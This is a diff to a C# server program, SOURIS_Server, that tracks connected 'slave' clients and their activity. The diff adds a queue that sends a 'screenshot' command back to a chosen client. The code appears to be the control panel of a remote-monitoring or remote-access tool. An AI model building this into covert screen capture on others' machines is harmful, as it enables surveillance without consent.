@@ -25,6 +25,7 @@ namespace SOURIS_Server
         public string RAM { get; set; }
         public string Activity { get; set; }
         public string Front { get; set; }
+        public string Nextinteract { get; set; }
     }
     /// <summary>
     /// Logique d'interaction pour MainWindow.xaml
@@ -105,10 +106,10 @@ namespace SOURIS_Server
                     state.buffer, 0, bytesRead));
                 content = state.sb.ToString();
                 addlistbox($"Read {content.Length} bytes from socket. \nData : {content}");
+                int count = 0;
                 if (content.Contains("|"))
                 {
                     string[] SlaveContent = content.Split('|');
-                    int count = 0;
                     while (Slavelist.Count <= count)
                     {
                         try
@@ -139,7 +140,13 @@ namespace SOURIS_Server
                         Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.Items.Refresh()));
                     }
                 }
-                Send(handler, content);
+                string msgback = "Ok";
+                if (!String.IsNullOrEmpty(Slavelist[count].Nextinteract))
+                {
+                    msgback = Slavelist[count].Nextinteract;
+                    Slavelist[count].Nextinteract = "";
+                }
+                Send(handler, msgback);
             }
         }
 
@@ -199,6 +206,11 @@ namespace SOURIS_Server
             {
                 MessageBox.Show(ex.ToString());
             }
+        }
+        private void Screenshot(object sender, RoutedEventArgs e)
+        {
+            int selected = listView1.SelectedIndex;
+            Slavelist[selected].Nextinteract = "screenshot";
         }
     }
 }
